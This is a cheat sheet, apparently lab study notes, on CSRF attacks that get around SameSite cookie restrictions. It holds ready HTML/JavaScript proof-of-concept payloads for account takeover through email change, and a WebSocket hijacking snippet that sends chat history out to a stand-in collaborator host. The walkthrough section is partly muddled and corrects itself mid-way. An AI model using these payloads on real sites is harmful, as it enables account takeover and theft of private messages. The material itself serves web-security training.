# CSRF — SameSite bypass

SameSite cookie restrictions prevent cookies from being sent on cross-site requests. Four bypass techniques: method override (Lax only blocks POST, not GET), client-side redirect gadget (same-site redirect carries Strict cookies), sibling domain abuse (same registrable domain = "same-site"), and cookie refresh grace period (new cookies have a 2-minute window before Lax enforcement).

## Quick reference
```html
<!-- Lax bypass: method override (_method=POST as GET) -->
<script>document.location="https://LAB/my-account/change-email?email=attacker@evil.com&_method=POST"</script>

<!-- Strict bypass: client-side redirect gadget on same site -->
<script>document.location="https://LAB/post/commentConfirmation?postId=../../my-account/change-email?email=attacker%40evil.com%26submit=1"</script>

<!-- Lax bypass: cookie refresh grace period (new cookie, 2-min window) -->
<form method="POST" action="https://LAB/my-account/change-email" id=csrfForm>
  <input name=email value="attacker@evil.com">
</form>
<script>
window.onclick = () => {
  window.open('https://LAB/social-login');
  setTimeout(() => document.getElementById('csrfForm').submit(), 2000);
}
</script>
<!-- Note: user must click to open popup; then wait 2s for session refresh -->
```

## Root cause
- **Lax:** blocks cross-site POST but allows cross-site GET top-level navigations → if server accepts GET for state changes, or supports method override, Lax is bypassable.
- **Strict:** blocks all cross-site requests including top-level GET, but only applies cross-site; a redirect that originates on the same site carries the cookies.
- **Sibling domain:** `chat.lab.com` and `lab.com` are "same-site" — a request from `chat.lab.com` is treated as same-site and sends all SameSite cookies.
- **Grace period:** Chrome's Lax-by-default waits 2 minutes after cookie issuance before enforcing Lax, to support OAuth flows.

## Find it
1. Check Set-Cookie response: is SameSite= specified? If not → browser defaults to Lax.
2. Check if the target action can be triggered via GET (or supports `_method` override param).
3. Look for client-side redirect gadgets on the target site that take a URL/path parameter.
4. Enumerate subdomains → any XSS there? Same registrable domain = same-site bypass path.
5. Does the site use OAuth / social login? → cookie refresh window available.

## Technique
**Lax bypass via method override:**
1. Confirm POST /my-account/change-email has no unpredictable tokens (SameSite is the only defense).
2. Confirm session cookies have no SameSite attribute (browser defaults to Lax).
3. Test if server accepts `?_method=POST` on a GET request (some frameworks honor this).
4. PoC: `<script>document.location="https://LAB/my-account/change-email?email=attacker@evil.com&_method=POST"</script>`

**Strict bypass via client-side redirect:**
1. Confirm SameSite=Strict on session cookie.
2. Find a client-side redirect on the target: e.g., `/post/commentConfirmation?postId=X` reads `postId` and redirects to `/post/X`.
3. This redirect is triggered by an on-site navigation → same-site → Strict cookies sent for the redirect destination.
4. Inject a path traversal + email change target into the `postId` param:
   - `postId=../../my-account/change-email?email=attacker%40evil.com%26submit=1`
5. PoC navigates to the on-site gadget → gadget redirects to `/my-account/change-email?email=...` → cookies sent (same-site) → email changed.

**Strict bypass via sibling domain:**
1. Map all subdomains; find chat WebSocket endpoint (e.g., `https://cms-LAB.web-security-academy.net`).
2. Confirm same registrable domain → "same-site" for cookie purposes.
3. Find XSS on sibling domain (e.g., URL param reflected unsanitized).
4. Exploit: PoC on exploit server redirects to sibling with XSS payload that makes a fetch/form POST to main domain (cookies send because same-site).
5. Can also exploit CSWSH (Cross-Site WebSocket Hijacking) from sibling: send `READY` to live chat → server replays chat history → exfiltrate via fetch to collaborator.

**Lax bypass via cookie refresh:**
1. Site uses OAuth / social login; after OAuth callback, session cookie is freshly issued (new) → 2-min Lax enforcement grace.
2. PoC: trick user into clicking → open popup to `/social-login` → refreshes session cookie → within 2s, submit POST to `/my-account/change-email`.
3. The fresh cookie is in the 2-min grace → Lax not yet enforced → cross-site POST sends cookies.
4. User must interact (click) to open popup (popup blocker bypass via click event).

## Payload arsenal
```html
<!-- Method override (Lax) -->
<script>document.location="https://LAB/my-account/change-email?email=attacker@evil.com&_method=POST"</script>

<!-- Client-side redirect (Strict) -->
<script>
document.location = "https://LAB/post/commentConfirmation?postId=../../my-account/change-email?email=attacker%40evil.com%26submit=1";
</script>

<!-- Sibling domain CSWSH (Strict via same-site) -->
<script>
var ws = new WebSocket('wss://LAB/chat');
ws.onopen = () => ws.send("READY");
ws.onmessage = e => fetch('https://COLLAB/?d='+encodeURIComponent(e.data));
</script>
<!-- Host on sibling domain (XSS or exploit server pointing to sibling domain) -->

<!-- Cookie refresh grace (Lax default) -->
<form method="POST" action="https://LAB/my-account/change-email" id=csrfForm>
  <input name=email value="attacker@evil.com">
</form>
<script>
window.onclick = () => {
  window.open('https://LAB/social-login');
  setTimeout(() => document.getElementById('csrfForm').submit(), 2000);
}
</script>
```

## Bypasses
| SameSite setting | Bypass |
|---|---|
| Lax (default / explicit) | Method override: GET + `_method=POST` |
| Lax (default) | Cookie refresh: force new session cookie, POST within 2-min grace |
| Strict | Client-side redirect gadget on same site |
| Strict | XSS or CSWSH on sibling domain (same registrable domain) |

## Exploitation walkthrough
**Sibling domain CSWSH (most complex):**
1. Find WebSocket handshake at `wss://cms-LAB/chat`.
2. Find XSS on `https://cms-LAB/` (e.g., reflected `message` param: `<script>alert(1)</script>`).
3. Host on exploit server:
   ```html
   <script>
   document.location = "https://cms-LAB/login?username=carlos&password=..." 
   </script>
   ```
   Actually: deliver PoC that loads XSS on `cms-LAB` which creates WebSocket → sends "READY" → receives chat history → exfiltrates to collaborator.

## Chaining
- SameSite bypass → CSRF → change email → account takeover → [Authentication](../../Authentication/).
- Sibling XSS → CSWSH → read private chat → credential leak.

## Tools
- **Burp Proxy** — confirm SameSite attribute (or absence) in Set-Cookie
- **Exploit server** — host PoC page
- **Burp Collaborator** — receive CSWSH exfiltrated data

## Labs

### SameSite Lax bypass via method override [Practitioner]
No CSRF token; no SameSite attribute (defaults to Lax). Server accepts `_method=POST` on GET. PoC: `document.location=".../change-email?email=attacker@evil.com&_method=POST"`. Key insight: Lax only blocks cross-site POST, not GET.

### SameSite Strict bypass via client-side redirect [Practitioner]
SameSite=Strict. Find redirect gadget: `/post/commentConfirmation?postId=X` redirects to `/post/X`. Inject: `postId=../../my-account/change-email?email=...`. PoC redirects on same site → cookies sent. Key insight: "same-site" redirect carries Strict cookies; the redirect destination gets the cookies.

### SameSite Strict bypass via sibling domain [Practitioner]
SameSite=Strict. `cms-LAB` is same-site sibling. WebSocket endpoint is CSWSH-vulnerable. XSS on sibling → WebSocket from sibling origin → "READY" → chat history received → exfiltrate. Key insight: same registrable domain = same-site; Strict cookies flow freely within.

### SameSite Lax bypass via cookie refresh [Practitioner]
No SameSite set (defaults to Lax). OAuth flow used. Open popup to `/social-login` → fresh session cookie issued → 2-min Lax grace. Submit POST change-email within grace window. Key insight: Chrome's Lax-by-default has a 2-minute grace period for fresh cookies.

## Real-world notes
- Method override (`_method`, `X-HTTP-Method-Override`) is a framework feature (Rails, Laravel) — check if active before giving up on Lax bypass.
- The 2-minute Lax grace period is a Chrome implementation detail designed for OAuth; it's a real bypass window on any OAuth-integrated site.
- Sibling domain scope: "same-site" = same registrable domain. `a.example.com` and `b.example.com` are same-site. `a.example.com` and `attacker.com` are cross-site.

## References
- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
